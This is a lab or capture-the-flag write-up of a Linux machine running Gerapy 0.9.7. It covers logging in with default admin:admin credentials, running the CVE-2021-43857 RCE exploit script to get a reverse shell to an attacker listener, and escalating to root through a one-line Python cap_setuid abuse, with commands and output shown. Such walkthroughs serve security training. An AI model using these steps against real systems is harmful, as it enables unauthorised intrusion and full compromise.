#Linux #Gerapy #CVE-2021-43857 #DefaultCreds #RCE #Capabilities #Python #PrivEsc

## Overview

Levram runs Gerapy 0.9.7, a web-based Scrapy spider management framework. Default credentials get in the door, and an authenticated RCE exploit (CVE-2021-43857) delivers a shell. The privilege escalation is clean: Python 3.10 has the `cap_setuid` capability set, which lets any process running under it call `os.setuid(0)` and become root without a password.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
```

The HTTP title `Gerapy` named the application immediately. The backend is CPython 3.10.6 running under a WSGI server.

## Foothold

### Default Credentials

The Gerapy login portal accepted the vendor default credentials without any modification:

```
admin : admin
```

Once logged in, the dashboard revealed the version: **Gerapy v0.9.7**.

> **Why default credentials keep working on management frameworks:** tools like Gerapy are often deployed internally, treated as low-risk because they're not directly internet-facing. Admins focus on locking down the perimeter and skip changing default logins on internal tooling. One exposed port defeats all of that.

### CVE-2021-43857, Authenticated RCE

Gerapy before 0.9.8 is vulnerable to remote code execution via the project build endpoint (CVE-2021-43857). The exploit script from Exploit-DB (50640) requires at least one project to exist:

```sh
python3 gerapy.py -t 192.168.180.24 -p 8000 -L 192.168.45.244 -P 443
[*] Getting the project list
IndexError: list index out of range
```

The error happens because the project list was empty. I created a dummy project named "evil" through the dashboard, then re-ran the exploit:

```sh
python3 gerapy.py -t 192.168.180.24 -p 8000 -L 192.168.45.244 -P 443
[*] Login successful! Proceeding...
[*] Found project: evil
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 443 ...
[*] Executing reverse shell payload
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.24] 45070
app@ubuntu:~/gerapy$
```

Shell as user `app`.

Local flag:

```sh
app@ubuntu:~$ cat local.txt
‹redacted›
```

## Privilege Escalation

### cap_setuid on Python 3.10

LinPEAS flagged a Linux capability on the Python interpreter:

```
/usr/bin/python3.10 cap_setuid=ep
```

> **Why `cap_setuid` on a Python binary equals root:** Linux capabilities let processes hold individual root privileges without being fully SUID root. `CAP_SETUID` specifically grants the ability to call `setuid()` to change the process's effective user ID to any value, including 0 (root). A Python binary with `cap_setuid=ep` (effective + permitted) can call `os.setuid(0)` and then spawn a shell. Unlike a SUID binary, capabilities survive the interpreter, so any script or one-liner run through that Python binary can escalate.

One line to root:

```sh
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
root
```

## Root

```sh
cat proof.txt
‹redacted›
```

## Takeaways

- **Test default credentials before any exploit search.** `admin:admin` saved all enumeration time here; the CVE was only needed after the door was already open.
- **Exploit scripts that index project lists need a project to exist.** When a script crashes on an empty list, check the application UI before debugging the exploit code.
- **`cap_setuid` on an interpreter is effectively SUID root.** LinPEAS and `getcap -r /` both surface this; it's a one-liner to escalate and easy to miss in manual enumeration.
